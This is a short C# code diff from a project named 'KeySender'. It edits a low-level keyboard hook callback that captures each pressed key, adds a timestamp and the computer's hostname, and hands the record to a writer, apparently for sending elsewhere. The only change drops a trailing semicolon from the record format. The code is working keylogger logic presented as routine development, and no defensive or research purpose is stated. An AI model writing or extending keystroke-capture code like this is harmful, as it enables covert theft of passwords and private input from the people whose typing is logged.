@@ -39,7 +39,7 @@ namespace KeySender
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 string time = DateTime.Now.ToString();
-                var p = $"{Convert.ToInt32(PackageType.Pressed)};{(Keys)vkCode};{time};{System.Net.Dns.GetHostName()};";
+                var p = $"{Convert.ToInt32(PackageType.Pressed)};{(Keys)vkCode};{time};{System.Net.Dns.GetHostName()}";
                 SingletonWriter.Instance.Write(p);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
